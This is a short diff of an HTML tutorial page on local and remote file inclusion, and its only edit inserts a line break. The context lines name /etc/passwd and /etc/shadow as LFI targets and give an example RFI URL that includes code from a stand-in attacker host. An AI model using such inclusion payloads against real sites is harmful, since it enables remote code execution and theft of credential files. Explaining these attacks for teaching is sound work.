@@ -15,7 +15,7 @@ for example <code> /etc/passwd </code> or <code> /etc/shadow </code>.
 <center> <img src="lfi-example.PNG"/> </center>
 <br>
 On the other hand while exploiting RFI you can upload file from remote server which in 99% of the times will result in 
-RCE(Remote Code Execution). For example <code> https://www.site.com/app.php?file=http://attackers.website.com/file.php </code>.
+RCE(Remote Code Execution). <br> For example <code> https://www.site.com/app.php?file=http://attackers.website.com/file.php </code>.
 You could execute malicious code from the <code> file.php </code> file and use it for evil intention. <br>
 <br>
 LFI is way more popular than RFI because nowadays it is way easier to protect against including Remote Malicious Files, but
